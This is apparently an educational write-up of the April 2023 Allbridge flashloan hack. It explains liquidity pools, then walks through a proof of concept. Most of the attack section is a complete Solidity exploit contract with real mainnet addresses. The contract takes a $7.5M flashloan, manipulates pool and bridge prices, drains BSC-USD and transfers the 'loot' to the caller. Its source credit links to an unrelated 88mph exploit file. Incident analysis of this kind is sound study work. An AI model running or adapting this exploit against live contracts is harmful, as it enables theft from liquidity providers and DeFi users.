# Allbridge


## What's Allbridge?
Allbridge is a leading cross-chain provider, specializing in integrating EVM with non-EVM blockchains.
Their mission is to make the blockchain world borderless by providing an 
infrastructure to freely move assets between various networks


## Amount stolen
$550k USD

2-04-2023

## Vulnerability
flashloan attack


## Analysis
The root cause appears to be the manipulation of the pool's swap price.
The actor plays dual roles of acting as LP and swapper to manipulate the price and then drain the pool funds.


## whats a pool?

Liquidity pools allow users to trade digital assets on decentralized exchanges 
within the decentralized finance (DeFi) ecosystem,

The assets held in a liquidity pool are locked in place by a smart
contract and are added to the pool by liquidity providers. 

In most cases, providers add an equal value of two tokens to a 
pool to create a market, which is similar to trading pairs on traditional exchanges. 

Market participants that provide liquidity (contribute crypto assets) to a liquidity pool will earn trading fees as 
a reward for the trades executed within the pool. 

# proof of concept (PoC) 


 - We start with a flashloan $7.5M of BUSD `pancakeSwap.swap(0, 7_500_000e18, address(this), "Test");`


During that flashloan we execute the following:

 - 2 million of 7.5 will be swapped for $2M of $BSC-USD in pool_0x312B
```solidity
        BUSD.approve(address(pool_0x312B), type(uint256).max);
        BSC_USD.approve(address(pool_0x312B), type(uint256).max);
        pool_0x312B.swap(address(BUSD), address(BSC_USD), 2_003_300e18, 1, address(this), block.timestamp + 100 seconds);
```


Then deposits $5M BUSD into pool 0x179a

```solidity
        BUSD.approve(address(pool_0x179a), type(uint256).max);
        pool_0x179a.deposit(5_000_000e18);
```

Swap BUSD to BSC_USD

```solidity
          pool_0x312B.swap(address(BUSD), address(BSC_USD), 496_700e18, 1, address(this), block.timestamp + 100 seconds);
```

Deposit $2 mil into pool_0xb19c

```solidity
        BSC_USD.approve(address(pool_0xb19c), type(uint256).max);
        pool_0xb19c.deposit(2_000_000e18);
```

The attacker then swaps $500K BSC-USD for $BUSD 
        in Allbridge's Bridge contract, resulting in a high 
        dividend for the previous liquidity deposit.



```solidity
   bytes32 bsc_usd = 0x00000000000000000000000055d398326f99059ff775485246999027b3197955;
        bytes32 busd = 0x000000000000000000000000e9e7cea3dedca5984780bafc599bd69add087d56;

        uint256 BSC_USD_bal = BSC_USD.balanceOf(address(this));
        bridge.swap(BSC_USD_bal, bsc_usd, busd, address(this));
```

       The BUSD liquidity in 0x179a is then removed, 
        at which point the liquidity balance within 
        the 0x179a pool is broken.

```solidity
          pool_0x179a.withdraw(4_830_262_616);
```
 
  The attacker was then able to swap out $790,000 
        of BSC-USD from Bridge using only $40,000 of BUSD.
        

```solidity
           bridge.swap(40_000e18, busd, bsc_usd, address(this));
```

Withdraw from pool_0xb19c
 
```solidity
        pool_0xb19c.withdraw(1_993_728_530);
```


Swap BSC_USD to BUSD in pool_0x312B

```solidity
        BSC_USD_bal = BSC_USD.balanceOf(address(this));
        pool_0x312B.swap(address(BSC_USD), address(BUSD), BSC_USD_bal, 1, address(this), block.timestamp + 100 seconds);
```


Repay flashloan


 ```solidity
        BUSD.transfer(address(pancakeSwap), 7_522_500e18);
```

Transfer loot to attacker


```solidity
        BUSD.transfer(tx.origin, BUSD.balanceOf(address(this)));
```


```solidity
    console.log("hacker BUSD bal after attack is        ", BUSD.balanceOf(tx.origin));
```


```solidity
   contract Exploit {
    IPancakePair pancakeSwap = IPancakePair(0x7EFaEf62fDdCCa950418312c6C91Aef321375A00);
    IERC20 BUSD = IERC20(0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56);
    IERC20 BSC_USD = IERC20(0x55d398326f99059fF775485246999027B3197955);
    IPool pool_0x312B = IPool(0x312Bc7eAAF93f1C60Dc5AfC115FcCDE161055fb0);
    IPool2 pool_0x179a = IPool2(0x179aaD597399B9ae078acFE2B746C09117799ca0);
    IPool2 pool_0xb19c = IPool2(0xB19Cd6AB3890f18B662904fd7a40C003703d2554);
    IBridge bridge = IBridge(0x7E6c2522fEE4E74A0182B9C6159048361BC3260A);

    function run() external {
        console.log("hacker BUSD bal before attack is       ", BUSD.balanceOf(tx.origin));

        // The attacker flashloans $7.5M of BUSD
        pancakeSwap.swap(0, 7_500_000e18, address(this), "Gimme da loot");
    }

    function pancakeCall(address sender, uint256 amount0, uint256 amount1, bytes calldata data) external {
        // Swaps $2M BUSD for $2M $BSC-USD in pool_0x312B
        BUSD.approve(address(pool_0x312B), type(uint256).max);
        BSC_USD.approve(address(pool_0x312B), type(uint256).max);

        pool_0x312B.swap(address(BUSD), address(BSC_USD), 2_003_300e18, 1, address(this), block.timestamp + 100 seconds);

        // Then deposits $5M BUSD into pool 0x179a
        BUSD.approve(address(pool_0x179a), type(uint256).max);
        pool_0x179a.deposit(5_000_000e18);

        // Swap BUSD to BSC_USD
        pool_0x312B.swap(address(BUSD), address(BSC_USD), 496_700e18, 1, address(this), block.timestamp + 100 seconds);

        // Deposit $2 mil into pool_0xb19c
        BSC_USD.approve(address(pool_0xb19c), type(uint256).max);
        pool_0xb19c.deposit(2_000_000e18);

        /*
         The attacker then swaps $500K BSC-USD for $BUSD 
        in Allbridge's Bridge contract, resulting in a high 
        dividend for the previous liquidity deposit.
        */

        bytes32 bsc_usd = 0x00000000000000000000000055d398326f99059ff775485246999027b3197955;
        bytes32 busd = 0x000000000000000000000000e9e7cea3dedca5984780bafc599bd69add087d56;

        uint256 BSC_USD_bal = BSC_USD.balanceOf(address(this));
        bridge.swap(BSC_USD_bal, bsc_usd, busd, address(this));

        /*
         The BUSD liquidity in 0x179a is then removed, 
        at which point the liquidity balance within 
        the 0x179a pool is broken.
        */

        pool_0x179a.withdraw(4_830_262_616);

        /*
         The attacker was then able to swap out $790,000 
        of BSC-USD from Bridge using only $40,000 of BUSD.
        */

        bridge.swap(40_000e18, busd, bsc_usd, address(this));

        // Withdraw from pool_0xb19c
        pool_0xb19c.withdraw(1_993_728_530);

        // Swap BSC_USD to BUSD in pool_0x312B
        BSC_USD_bal = BSC_USD.balanceOf(address(this));
        pool_0x312B.swap(address(BSC_USD), address(BUSD), BSC_USD_bal, 1, address(this), block.timestamp + 100 seconds);

        // Repay flashloan
        BUSD.transfer(address(pancakeSwap), 7_522_500e18);

        // Transfer loot to attacker
        BUSD.transfer(tx.origin, BUSD.balanceOf(address(this)));

        console.log("hacker BUSD bal after attack is        ", BUSD.balanceOf(tx.origin));
    }
}
```


**Code provided by:** [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/88mph_exp.sol)


[**< Back**](https://patronasxdxd.github.io/CTFS/)
